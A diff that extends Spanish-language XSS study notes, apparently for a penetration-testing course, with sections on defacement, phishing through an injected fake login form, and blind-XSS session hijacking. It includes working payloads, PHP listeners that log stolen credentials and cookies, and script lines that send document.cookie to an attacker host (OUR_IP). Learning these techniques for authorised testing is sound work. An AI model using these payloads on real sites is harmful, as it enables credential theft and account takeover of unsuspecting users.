@@ -127,6 +127,145 @@ python xsstrike.py -u "http://TARGET/index.php?task=test"
 
 ---
 
+## Defacing (Stored XSS)
+
+Cuatro elementos principales para modificar la apariencia de una pagina:
+
+```javascript
+// Color de fondo
+document.body.style.background = "#141d2b"
+
+// Imagen de fondo
+document.body.background = "https://example.com/img.svg"
+
+// Titulo de pagina
+document.title = 'Hacked'
+
+// Contenido HTML completo del body
+document.getElementsByTagName('body')[0].innerHTML = '<center><h1>Hacked</h1></center>'
+
+// Con jQuery (si esta importado)
+$("#todo").html('New Text');
+```
+
+**Payload completo:**
+```html
+<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color:white">Hacked</h1></center>'</script>
+```
+
+---
+
+## Phishing — Inyectar Formulario Falso de Login
+
+**1. Construir el formulario:**
+```html
+<h3>Please login to continue</h3>
+<form action=http://OUR_IP>
+    <input type="username" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" name="submit" value="Login">
+</form>
+```
+
+**2. Inyectarlo con `document.write()` y limpiar el formulario original:**
+```javascript
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+document.getElementById('urlform').remove();
+```
+
+- Agregar `<!--` al final del payload para comentar HTML residual.
+- Usar `CTRL+SHIFT+C` → Page Inspector para encontrar el `id` del elemento a remover.
+
+**3. Capturar credenciales con PHP:**
+```bash
+mkdir /tmp/tmpserver && cd /tmp/tmpserver
+# Crear index.php:
+```
+```php
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+```
+```bash
+sudo php -S 0.0.0.0:80
+```
+
+---
+
+## Session Hijacking (Blind XSS)
+
+**Blind XSS** = vulnerabilidad que se ejecuta en una pagina a la que no tienes acceso (ej: panel de admin, tickets de soporte, formularios de registro).
+
+Posibles vectores de entrada ciegos: Contact Forms, Reviews, User Details, Support Tickets, HTTP `User-Agent` header.
+
+### Paso 1 — Identificar el campo vulnerable
+
+Usar un script remoto que identifica el campo por su nombre en la request:
+
+```html
+<!-- Cada campo lleva el nombre del input como path -->
+<script src=http://OUR_IP/fullname></script>
+<script src=http://OUR_IP/username></script>
+<script src=http://OUR_IP/website></script>
+```
+
+Otros formatos de payload Blind XSS:
+```html
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>$.getScript("http://OUR_IP")</script>
+```
+
+Iniciar listener:
+```bash
+mkdir /tmp/tmpserver && cd /tmp/tmpserver
+sudo php -S 0.0.0.0:80
+```
+
+### Paso 2 — Robar la cookie de sesion
+
+Crear `script.js` en el servidor:
+```javascript
+new Image().src='http://OUR_IP/index.php?c='+document.cookie
+```
+
+Payload XSS que carga el script:
+```html
+<script src=http://OUR_IP/script.js></script>
+```
+
+PHP para capturar y guardar cookies (`index.php`):
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+### Paso 3 — Usar la cookie robada
+
+En Firefox → `Shift+F9` → Storage → agregar cookie manualmente:
+- `Name` = parte antes del `=`
+- `Value` = parte despues del `=`
+
+Luego recargar la pagina para acceder como la victima.
+
+---
+
 ## Limitaciones a Recordar
 
 - XSS esta limitado al motor JS del browser (V8, SpiderMonkey, etc.)
@@ -139,7 +278,7 @@ python xsstrike.py -u "http://TARGET/index.php?task=test"
 ## Quick Reference — Metodologia
 
 ```
-1. Identificar inputs (forms, URL params, headers)
+1. Identificar inputs (forms, URL params, headers, User-Agent)
 2. Probar: <script>alert(window.origin)</script>
 3. Si bloqueado: <img src="" onerror=alert(window.origin)>
 4. Ver Network tab: ¿hay HTTP request? → determinar tipo
@@ -147,4 +286,9 @@ python xsstrike.py -u "http://TARGET/index.php?task=test"
 6. Revisar URL con # → DOM-based
 7. Para Reflected/DOM: construir URL maliciosa para victima
 8. Para Stored: verificar que afecta a otros usuarios
+
+--- Explotacion ---
+9. Defacing      → document.body.style.background / innerHTML (Stored)
+10. Phishing      → document.write(form) + php listener (Reflected/Stored)
+11. Session Hijack → Blind XSS: script src + new Image().src + cookie (Blind/Stored)
 ```
